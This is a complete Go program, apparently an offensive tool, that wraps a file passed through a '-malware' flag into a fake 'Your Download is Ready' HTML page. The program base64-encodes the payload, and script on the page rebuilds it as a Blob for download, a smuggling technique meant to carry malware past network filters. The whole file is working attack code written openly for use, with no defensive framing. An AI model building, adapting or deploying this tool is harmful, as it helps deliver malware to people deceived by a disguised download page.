package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
)

// EncodeFileToBase64 reads a file and encodes its content to a base64 string
func EncodeFileToBase64(filePath string) (string, error) {
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(data), nil
}

// CreateHTMLSmugglingFile generates the HTML content and writes it to the specified file
func CreateHTMLSmugglingFile(fileName string, base64Content string, downloadFileName string) error {
	htmlTemplate := `<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>Download Page</title>
	<style>
		body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f0f0; }
		.container { text-align: center; background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
		.button { background-color: #007bff; color: white; padding: 15px 20px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; border-radius: 5px; margin-top: 20px; }
		.button:hover { background-color: #0056b3; }
	</style>
</head>
<body>
	<div class="container">
		<h1>Your Download is Ready</h1>
		<p>Click the button below to download your file.</p>
		<a id="downloadLink" class="button" href="#" download="%s">Download Now</a>
	</div>
	<script>
		const base64Data = "%s";
		const blob = new Blob([Uint8Array.from(atob(base64Data), c => c.charCodeAt(0))], { type: 'application/octet-stream' });
		const url = URL.createObjectURL(blob);
		const downloadLink = document.getElementById('downloadLink');
		downloadLink.href = url;
	</script>
</body>
</html>`

	htmlContent := fmt.Sprintf(htmlTemplate, downloadFileName, base64Content)
	return ioutil.WriteFile(fileName, []byte(htmlContent), 0644)
}

func main() {
	fileName := flag.String("filename", "download.html", "The name of the HTML file to create")
	malwarePath := flag.String("malware", "", "The path to the malware file")
	flag.Parse()

	if *malwarePath == "" {
		fmt.Println("Error: malware path is required")
		flag.Usage()
		os.Exit(1)
	}

	base64Content, err := EncodeFileToBase64(*malwarePath)
	if err != nil {
		fmt.Printf("Error encoding file to base64: %v\n", err)
		os.Exit(1)
	}

	// Get the base name of the malware file to use as the download file name
	downloadFileName := filepath.Base(*malwarePath)

	err = CreateHTMLSmugglingFile(*fileName, base64Content, downloadFileName)
	if err != nil {
		fmt.Printf("Error creating HTML file: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("HTML smuggling file created successfully: %s\n", *fileName)
}
